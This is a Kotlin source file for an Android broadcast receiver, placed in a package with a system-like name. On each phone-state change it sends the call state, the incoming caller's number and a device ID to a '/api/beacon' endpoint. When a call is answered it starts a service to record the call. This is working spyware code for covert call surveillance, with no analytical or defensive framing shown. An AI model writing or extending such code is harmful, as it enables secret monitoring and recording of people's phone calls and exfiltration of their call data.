package com.sys.svc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import org.json.JSONObject
import kotlinx.coroutines.*

class CallReceiver : BroadcastReceiver() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != TelephonyManager.ACTION_PHONE_STATE_CHANGED) return
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val num = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: ""
        
        val body = JSONObject()
            .put("device_id", Prefs.deviceId(ctx))
            .put("kind", "call")
            .put("payload", state + " " + num)
            
        scope.launch { Net.postJson("/api/beacon", body) }
        
        if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
            val i = Intent(ctx, CoreService::class.java).setAction("RECORD_CALL")
            ctx.startService(i)
        }
    }
}